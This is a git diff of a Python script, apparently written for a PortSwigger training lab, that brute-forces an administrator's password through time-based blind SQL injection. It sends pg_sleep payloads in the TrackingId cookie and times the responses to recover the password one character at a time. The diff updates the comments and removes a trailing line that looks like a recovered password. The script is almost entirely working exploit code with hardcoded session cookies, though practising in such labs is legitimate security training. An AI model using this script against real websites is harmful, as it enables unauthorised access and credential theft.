@@ -1,6 +1,6 @@
 import requests   #you have to import the requests library --> pip install requests
 
-""" this script is brute forcing the password of an admin in data base sql injection in portswigger blind sqli lab 11 """
+""" this script is brute forcing the password of an admin in data base sql injection in portswigger time based blind sqli lab 14 """
 
 #list containing alphapets&numbers from 0-9
 list =['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
@@ -15,17 +15,14 @@ burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/
                  , "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin"
                  , "Sec-Fetch-User": "?1", "Te": "trailers"}
 
-#the page should return 500 status code to you if the query is right
+#the page should return after 3 seconds if the query is right
 
 #brute force
 for y in range(1,21): #20 chars of the password
     for i in list:  
-        #sql query that return true if  password[y] = i from list
         payload = f"'||(SELECT+CASE+WHEN+(substring(password,{y},1)%3d'{i}')+THEN+pg_sleep(3)+ELSE+''+END+FROM+users+where+username%3d'administrator')--"
         burp0_cookies = {"TrackingId": f"V4jDFhgc90zDN29L{payload}" # put your TrackingId & session instead
                         ,"session": "jEC6QOk1ZpzjtetDUmyLnHxZ3iGyvyR3"}
         data=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
-        if data.elapsed.total_seconds()>2: #if {Welcome back!} is in response then the query is true
+        if data.elapsed.total_seconds()>2: #if response time >2 seconds then the query is true
             print(i,end="") #print the litter
-
-#pepq52j9eg28olkjcjf9
